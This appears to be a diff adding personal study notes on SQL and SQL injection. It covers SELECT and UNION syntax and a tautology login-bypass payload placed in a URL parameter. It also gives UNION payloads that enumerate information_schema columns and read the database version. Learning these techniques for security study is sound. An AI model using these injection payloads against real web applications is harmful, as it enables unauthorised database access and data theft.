@@ -1,0 +1,45 @@
+##########################################################
+              Structured Query Language
+##########################################################
+SELECT      Extracts data from a database
+UNION       Used to combine the result-set of two or more SELECT statements
+
+There will always be an information_schema database
+Databases use tables
+
+SELECT <column>,<column> FROM <Database>.<TABLE>;
+SELECT * FROM <Database>.<TABLE_1> UNION select <column><column>,1,2 FROM <Database>.<Table_2>;     #Columns 1 & 2 are placeholders for when table 2 doesn't have the same number of columns
+
+###################
+       SQLI
+###################
+
+USER: john' OR 1='1
+would read as 'john' OR 1='1' and always read true
+
+NETWORK TAB IN DEVELOPER TOOLS
+find the post request from entering any creds
+enter variables into URL to send a GET request
+  .php?username=john' OR 1='1&
+
+
+Union SELECT 1,2,3<,4,5,6...>
+  show what positions in the union statement will be displayed where on the table
+
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns      #GOAT
+  Figures out what column are in what table
+UNION SELECT 1,2,@@version
+  Displays version #
+
+
+
+
+
+
+
+
+
+
+
+
+
